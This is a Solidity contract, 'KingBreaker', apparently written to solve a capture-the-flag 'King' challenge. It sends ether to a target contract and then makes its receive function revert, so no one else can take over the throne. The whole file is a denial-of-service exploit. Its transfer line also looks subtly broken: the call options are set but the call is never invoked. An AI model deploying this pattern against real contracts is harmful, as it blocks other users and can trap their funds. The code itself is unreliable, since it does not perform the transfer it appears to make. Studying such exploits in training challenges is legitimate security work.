// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract KingBreaker {
    address payable public kingAddress;
    bool public attack = false;

    constructor(address payable _kingAddress) {
        kingAddress = _kingAddress;
    }

    function toggleAttack() external {
        attack = !attack;
    }

    function kingTransfer() external payable {
        kingAddress.call{gas: 2000000, value: 1000000000000000};
    }

    receive() external payable {
        require(!attack, "Nice try, but you can't do that.");
    }
}